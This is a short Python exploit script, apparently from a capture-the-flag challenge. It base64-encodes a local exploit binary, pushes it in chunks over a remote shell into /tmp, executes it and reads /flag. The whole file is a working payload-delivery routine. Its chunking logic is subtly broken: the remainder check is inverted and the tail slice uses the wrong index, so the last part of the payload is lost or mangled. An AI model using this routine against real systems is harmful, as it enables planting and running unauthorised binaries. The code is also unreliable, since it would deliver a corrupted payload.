#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Remote: ./exp.py remote ip:port -nl

import subprocess
from base64 import b64decode, b64encode

from lianpwn import *

cli_script()

io: tube = gift.io
context.log_level = "info"

ia()

commands = []

exp_data_list = []
SPLIT_LENGTH = 0x100
with open("./exploit", "rb") as f_exp:
    exp_data = b64encode(f_exp.read()).decode()
lg_inf("Data length: " + str(len(exp_data)))
for i in range(len(exp_data) // SPLIT_LENGTH):
    exp_data_list.append(exp_data[i * SPLIT_LENGTH : (i + 1) * SPLIT_LENGTH])
if not len(exp_data) % SPLIT_LENGTH:
    exp_data_list.append(exp_data[(len(exp_data) // SPLIT_LENGTH) :])


commands.append("cd /tmp; touch ./exp.b64")
for i in exp_data_list:
    commands.append("echo -n '" + i + "'>> ./exp.b64")
commands.append("base64 -d ./exp.b64 > ./exp; chmod +x ./exp; ./exp")
commands.append("cat /flag")

for i in commands:
    sl(i)

ia()
